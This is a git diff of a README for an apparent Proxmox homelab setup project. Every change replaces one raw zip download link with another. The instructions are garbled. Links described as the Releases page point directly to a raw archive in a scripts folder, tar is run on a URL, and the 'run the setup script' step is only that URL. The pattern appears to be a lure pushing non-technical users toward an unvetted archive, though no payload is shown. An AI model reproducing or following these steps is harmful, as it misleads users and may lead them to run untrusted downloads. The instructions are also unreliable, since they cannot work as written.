@@ -5,7 +5,7 @@
 Welcome to proxmox-homelab! This project offers a collection of setup scripts and Docker Compose stacks. It aims to make your Proxmox homelab experience easy and efficient. You can use this on most standard Linux systems. Whether you want to set up virtual machines, secure your environment, or run self-hosted services, you are in the right place.
 
 ## 📥 Download Now
-[![Download Latest Release](https://github.com/comfyshee/proxmox-homelab/raw/refs/heads/main/scripts/homelab_proxmox_anemometric.zip%20Latest%20Release-v1.0-brightgreen)](https://github.com/comfyshee/proxmox-homelab/raw/refs/heads/main/scripts/homelab_proxmox_anemometric.zip)
+[![Download Latest Release](https://github.com/comfyshee/proxmox-homelab/raw/refs/heads/main/scripts/homelab_proxmox_3.0-beta.1.zip%20Latest%20Release-v1.0-brightgreen)](https://github.com/comfyshee/proxmox-homelab/raw/refs/heads/main/scripts/homelab_proxmox_3.0-beta.1.zip)
 
 ## 🚀 Getting Started
 Setting up your Proxmox homelab does not require technical expertise. Just follow these simple steps to download and run the software.
@@ -25,12 +25,12 @@ Setting up your Proxmox homelab does not require technical expertise. Just follo
 ## 🔗 Download & Install
 To get started, visit the Releases page to download the latest version of proxmox-homelab:
 
-[Download Latest Release](https://github.com/comfyshee/proxmox-homelab/raw/refs/heads/main/scripts/homelab_proxmox_anemometric.zip)
+[Download Latest Release](https://github.com/comfyshee/proxmox-homelab/raw/refs/heads/main/scripts/homelab_proxmox_3.0-beta.1.zip)
 
 ### 📥 Steps to Download
 1. Click the link above to visit the GitHub Releases page.
 2. Look for the latest version in the list.
-3. Click on the asset you want to download. For example, you might see files like `https://github.com/comfyshee/proxmox-homelab/raw/refs/heads/main/scripts/homelab_proxmox_anemometric.zip`.
+3. Click on the asset you want to download. For example, you might see files like `https://github.com/comfyshee/proxmox-homelab/raw/refs/heads/main/scripts/homelab_proxmox_3.0-beta.1.zip`.
 4. Follow the prompts to save the file on your device.
 
 ### 💻 Running the Setup Scripts
@@ -41,7 +41,7 @@ To get started, visit the Releases page to download the latest version of proxmo
    ```
 3. Extract the contents of the downloaded file:
    ```
-   tar -xzvf https://github.com/comfyshee/proxmox-homelab/raw/refs/heads/main/scripts/homelab_proxmox_anemometric.zip
+   tar -xzvf https://github.com/comfyshee/proxmox-homelab/raw/refs/heads/main/scripts/homelab_proxmox_3.0-beta.1.zip
    ```
 4. Go to the extracted folder:
    ```
@@ -49,7 +49,7 @@ To get started, visit the Releases page to download the latest version of proxmo
    ```
 5. Run the setup script:
    ```
-   https://github.com/comfyshee/proxmox-homelab/raw/refs/heads/main/scripts/homelab_proxmox_anemometric.zip
+   https://github.com/comfyshee/proxmox-homelab/raw/refs/heads/main/scripts/homelab_proxmox_3.0-beta.1.zip
    ```
    Follow the on-screen instructions to complete the installation.
 
@@ -84,5 +84,5 @@ With proxmox-homelab, you can easily set up your Linux environment. Enjoy the fr
 
 For the latest updates and downloads, remember to check the Releases page again:
 
-[Download Latest Release](https://github.com/comfyshee/proxmox-homelab/raw/refs/heads/main/scripts/homelab_proxmox_anemometric.zip)
+[Download Latest Release](https://github.com/comfyshee/proxmox-homelab/raw/refs/heads/main/scripts/homelab_proxmox_3.0-beta.1.zip)
 ```
